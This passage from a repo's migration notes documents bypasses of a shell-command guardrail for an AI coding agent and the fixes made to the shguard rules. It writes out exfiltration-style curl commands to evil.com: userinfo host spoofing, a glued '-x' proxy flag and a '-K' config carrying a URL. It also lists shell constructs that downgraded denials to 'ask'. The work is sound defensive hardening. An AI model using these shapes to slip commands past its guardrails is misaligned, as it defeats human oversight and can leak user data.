curl http://localhost:@evil.com     old=deny  shguard=allow (pre-fix)
curl http://localhost:80@evil.com   old=deny  shguard=allow (pre-fix)
```

Both connect to **evil.com**, not localhost — a real exfiltration
vector `block-dangerous.sh`'s `LOCAL_URL_RE` regex closed but plain
prefix/exact target matching couldn't. **Fixed by switching
`dotfiles-network-curl-remote`'s `except_targets` from `exact`/`prefix`
string matching to the `url_host` matcher** (shguard#102, PR#207 merged
2026-08-15, ahead of this repo's 2026-08-20 flake pin) — `url_host`
parses the candidate as a real URL and compares its actual host
component, closing the userinfo-spoofing shape entirely rather than
narrowing it. Fable-reviewed 2026-08-24 (independent verification
against a scratch config with an identical rule shape): the bypass
repro cases now deny, ordinary localhost usage
(`http://localhost:3000/api`, `-o out.json http://127.0.0.1:8080/`,
IPv6, case-insensitive host, `127.1`/`0x7f.0.0.1` numeric forms, etc.)
still allows, and no new bypass was found for this specific rule. Per
the README's explicit warning, the old `exact`/`prefix` entries were
**removed**, not layered alongside `url_host` — `except_targets`
alternatives are OR'd, so keeping even one prefix entry would have
silently reopened the exact bypass this fix exists to close.

`config.toml` is one of this repo's own guardrail files
(`block-config-edit.sh` blocks Claude from editing it directly), so the
fix is written here as the exact diff to apply manually rather than
applied by Claude:

```diff
 except_targets = [
-  { exact = "http://localhost" }, { prefix = "http://localhost:" }, { prefix = "http://localhost/" },
-  { exact = "https://localhost" }, { prefix = "https://localhost:" }, { prefix = "https://localhost/" },
-  { exact = "http://127.0.0.1" }, { prefix = "http://127.0.0.1:" }, { prefix = "http://127.0.0.1/" },
-  { exact = "https://127.0.0.1" }, { prefix = "https://127.0.0.1:" }, { prefix = "https://127.0.0.1/" },
-  { exact = "http://[::1]" }, { prefix = "http://[::1]:" }, { prefix = "http://[::1]/" },
-  { exact = "https://[::1]" }, { prefix = "https://[::1]:" }, { prefix = "https://[::1]/" },
+  # url_host only — never add exact/prefix entries alongside: except_targets
+  # are OR'd, and a retained prefix entry reopens the userinfo bypass this
+  # fix closes (see #23 in this doc). Scheme-blind by design (excepts
+  # http/https/ws/wss/ftp alike).
+  { url_host = "localhost" },
+  { url_host = "127.0.0.1" },
+  { url_host = "[::1]" },
 ]
```

Once applied, `tests/shguard-parity-check.sh`'s two userinfo-bypass
cases (`curl http://localhost:@evil.com`,
`curl http://localhost:80@evil.com`) move from `KNOWN_DELTA` to plain
passing cases — deliberately, so a future regression (e.g. someone
re-adding a prefix entry) fails the parity check instead of printing as
an expected delta.

**Together with #25 (found in the same fable pass), this is now why
full cutover remains paused for the curl/rsync area** — not the
userinfo bypass any more, which is closed.

**`-K`/`--config` deliberately excluded from `value_flags`, unlike the
other 13 flags.** `curl -K file.cfg` reads additional directives —
including `url = "..."` — from `file.cfg`, so the flag's value can
itself carry a network target, unlike `-o`/`-X`/`-d`/`-H`/etc. (bodies,
headers, local paths, auth strings — none of which point at a target).
Declaring `K` in `value_flags` would have let `curl -K /tmp/x.cfg
http://localhost:3000/` sail through even when `x.cfg` contains
`url = "https://evil.com/exfil"`. Verified live: with `K` excluded,
this now correctly denies — stricter than `block-dangerous.sh` ever
was (the old hook had no `-K` coverage at all). Kept as a documented
`KNOWN_DELTA` (`old=allow`, `shguard=deny`) rather than an unexpected
parity failure, since it's a deliberate improvement, not a gap.

**rsync bare-relative-path over-block (friction, not security).**
`except_targets` for `dotfiles-network-rsync-remote` covers `/`, `./`,
`../`, `~`, and `.` — but not a bare relative path with no prefix at
all:

```
rsync -a ./src/ ./dst/   old=allow  shguard=allow   (already covered)
rsync -a src/ dst/       old=allow  shguard=deny    (new over-block)
```

Both are equally local, but a bare `src/` matches none of the except
entries. Not fixable by adding a bare-word exception — that would also
re-admit `host:path` remote specs (rsync's own remote-path syntax has
no prefix that distinguishes it from a plain relative path). Locked in
as a `KNOWN_DELTA` case (`rsync -a src/ dst/`) in
`tests/shguard-parity-check.sh`.

Userinfo bypass filed as
[shguard#147](https://github.com/tsukasaI/shguard/issues/147) — ticket
still open upstream (relabeled P2, since a real fix path now exists via
`url_host`), tracked here as resolved once this repo applies the diff
above. The rsync bare-relative-path sub-gap is not filed — pure
friction, low severity, revisit if/when this migration resumes.

## 24. `if`/background job (`&`)/`[[ ]]`/`!` hit the same parse-failure path as #20 — #75 didn't cover them, blocks full cutover

Found via continued shadow-log observation (`claude-code/hooks/
shguard-shadow.sh`) after #20's fix (shguard#75, closed 2026-08-01)
landed. Mining `"unsupported construct"` reasons from the shadow log
dated after 2026-08-06 (i.e. from the fixed binary) still shows real
occurrences: `if` clause (43), background job `&` (14), extended test
`[[ ]]` (12), pipeline negation `!` (1) — all against real commands
from actual sessions, not synthetic edge cases (e.g. a retry loop with
`if ! echo "$out" | rg -q ...; then break; fi`).

This is the identical failure shape #20 described — `src/gate.rs`'s
parse-error path returns a blanket `ask` without ever running the rule
engine, built-in or `dotfiles-*` rules alike — just for a different set
of constructs that #75's fix didn't happen to cover. Verified live
against the installed 0.4.0 binary, same repro pattern as #20:

```
if true; then <built-in-denied-cmd>; fi   old: deny   shguard: ask ("unsupported construct: if clause")
<built-in-denied-cmd> &                   old: deny   shguard: ask ("unsupported construct: background job (&)")
[[ -d /tmp/x ]] && <built-in-denied-cmd>  old: deny   shguard: ask ("unsupported construct: extended test command ([[ ]])")
```

(`<built-in-denied-cmd>` stands in for a command shguard's own
built-in blocklist denies unconditionally — omitted verbatim in this
doc for the same reason it's omitted from the filed issue: this repo's
own local guardrail hook pattern-matches on the literal string even
inside a quoted example.)

Same conclusion as #20: not filed as fixable from `config.toml` — this
is a parser-translation gap in shguard itself, not a rule-schema
expressiveness limit. Filed as
[shguard#191](https://github.com/tsukasaI/shguard/issues/191), closed
2026-08-15.

**Resolved, confirmed live 2026-08-24.** Mined the shadow log
(`~/.local/share/shguard-shadow/shadow.jsonl`) for
`"unsupported construct"` reasons after the 2026-08-23 `darwin-rebuild
switch` onto shguard 0.6.0 (the pin that carries #191's fix): zero
occurrences of `if clause`, `background job (&)`, `extended test
command ([[ ]])`, or `pipeline negation (!)` since that switch, against
5+ occurrences of `if clause` alone in the window immediately before it
(2026-08-15 through 2026-08-18, i.e. before this machine had actually
rebuilt onto the fixed binary — the ticket closing on 2026-08-15 and
this machine picking up the fix are two different events). This closes
#24 as a live cutover blocker, not just a closed ticket.

Residual, out of scope for this entry: the same post-2026-08-23 window
of the shadow log surfaces several *new* "unsupported construct"
categories not covered by #20 or #24 — several parameter-expansion
forms (`${var@Q}`-style substitution, `${#var}`, `${arr[@]}`,
`${PIPESTATUS[0]}`, suffix-pattern removal), here-strings (`<<<`), a
`case` clause, and one "compound-command keyword nesting exceeds the
raw count cap" — none yet triaged for whether the old hook would have
denied the underlying command (the same distinction that made #20/#24
real blockers rather than pure friction). Not filed upstream and not
added to this doc as a numbered entry yet; flagging here so it isn't
lost, and revisit before treating full cutover as fully clear.

## 25. curl glued proxy flag (`-xhttp://evil.com`) bypasses the localhost-only rule

Found by the same fable review (2026-08-24) that verified #23's
`url_host` fix, while checking for other bypass shapes against the same
`dotfiles-network-curl-remote` rule. Not a variant of #23 — a distinct
gap, previously undocumented.

curl's short proxy flag accepts its value glued directly to the flag
with no separator: `-xhttp://evil.example.com` is equivalent to
`-x http://evil.example.com` / `--proxy http://evil.example.com`.
`block-dangerous.sh` denied this (confirmed by source read of
`block-dangerous.sh:250-259`: after its own localhost-prefix stripping,
the leftover `http://` from the glued value still trips the block).
Both the pre-#23-fix and post-#23-fix `config.toml` **allow** it
(confirmed live): `except_targets`/`value_flags` only inspect tokens
shguard's own candidate-target detection recognizes, and a value glued
onto a single-dash flag with no `=` is indistinguishable by shape alone
from an ordinary combined short-flag cluster (e.g. `-sSL`) — shguard
never treats it as a candidate target at all, so a request to a fully
local, `except_targets`-exempted URL gets silently proxied through an
attacker-controlled host, exfiltrating headers/body to it.

```
curl -xhttp://evil.com http://localhost:3000/api   old: deny   shguard: allow
```

Fixable from `config.toml`: shguard has an `attached_value_flags` field
(distinct from `value_flags`) precisely for this glued-short-flag shape
— declaring `attached_value_flags = ["x"]` on the curl rule makes the
glued value a real candidate target, so it gets checked against
`except_targets` like any other. **Not applied in the same change as
#23** — this repo currently has no curl `-x`/`--proxy` rule at all to
attach it to (the separate-token forms `-x http://evil.com` and
`--proxy=http://evil.com` are unaffected by this gap and already deny
today, confirmed live), and per shguard's README, declaring a flag in
`attached_value_flags` also changes what counts as *the* candidate
target for the whole rule (it can newly suppress a match, not just
widen detection) — worth its own reviewed change rather than folding
into #23's diff. Do **not** "fix" this by adding `x` to `value_flags`
instead of `attached_value_flags` — that would flip the currently-safe
separate-token forms (`-x http://evil.com`, `--proxy=http://evil.com`)
to allow, since `value_flags` means "this flag's value is never a
target," the opposite of what's needed here.

**Resolved 2026-08-31.** `attached_value_flags = ["x"]` applied to
`dotfiles-network-curl-remote`. Verified live: `curl -xhttp://evil.com
http://localhost:3000/api` now denies; ordinary local proxy usage
(`curl -x http://localhost:8080/ http://localhost:3000/`) and unrelated
combined short-flag clusters (`curl -fsSL http://localhost:3000/`)
still allow. `tests/shguard-parity-check.sh` confirms no regression
(74/84 passed, 10 known deltas, down from 11; this case no longer
listed). The rsync bare-relative-path sub-gap in #23 remains the only
open item in this rule area. Filed as
[dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49), close
manually once this note is reviewed.
